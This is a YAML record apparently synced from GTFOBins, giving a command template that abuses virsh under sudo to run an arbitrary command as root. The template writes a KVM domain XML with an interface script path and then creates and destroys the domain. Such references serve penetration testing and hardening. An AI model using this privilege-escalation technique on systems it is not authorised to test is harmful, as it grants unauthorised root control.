id: gtfobins/virsh/command/sudo
type: binary
platform: linux
name: virsh
phases:
- execution
- privilege-escalation
capabilities:
- command-execution
privilege_required: sudo
sources:
- project: GTFOBins
  upstream_url: https://gtfobins.github.io
  license: GPL-3.0
  upstream_version: acd5246
  last_synced: '2026-08-25'
commands:
- template: "cat >/path/to/temp-file.xml <<EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type\
    \ arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface\
    \ type='ethernet'>\n      <script path='/path/to/command'/>\n    </interface>\n  </devices>\n</domain>\n\
    EOF\nvirsh -c qemu:///system create /path/to/temp-file.xml\nvirsh -c qemu:///system destroy x"
references:
- https://gtfobins.github.io/gtfobins/virsh/
tags:
- linux
- unix
- gtfobins
